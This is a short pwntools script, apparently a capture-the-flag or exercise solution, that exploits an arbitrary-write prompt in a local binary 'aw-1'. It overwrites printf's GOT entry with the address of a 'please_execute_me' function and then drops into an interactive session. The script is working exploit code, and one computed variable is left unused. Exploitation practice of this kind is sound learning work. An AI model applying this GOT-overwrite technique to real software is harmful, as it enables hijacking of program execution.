#!/usr/bin/env python

from pwn import *
import os

p = process("./aw-1")


# This function will read your input for N bytes and then write them to an address A.
print(p.recvline())
# How many bytes do you want to write (N, in decimal, max 128 bytes)?
print(p.recvline())

got_of_printf = p.elf.got['printf']
print("Got of printf %s" % hex(got_of_printf))

p.sendline('8')
# What is the address that you want to write (A, in hexadexmial, e.g., 0xffffde01)?
print(p.recvline())
p.sendline(hex(got_of_printf))

# Please provide your input (MAX 8 bytes)
print(p.recvline())


# $1 = {<text variable, no debug info>} 0x7fbe5edbd800 <__printf>
# $2 = {<text variable, no debug info>} 0x400851 <please_execute_me>

printf_addr = 0x7fbe5edbd800
execute_me=0x400851
addr_execute = got_of_printf - printf_addr + execute_me

# $2 = {<text variable, no debug info>} 0x400851 <please_execute_me>
print('hex of please_execute_me', hex(execute_me))
print(hex(execute_me))
p.sendline(p64(execute_me))

p.interactive()

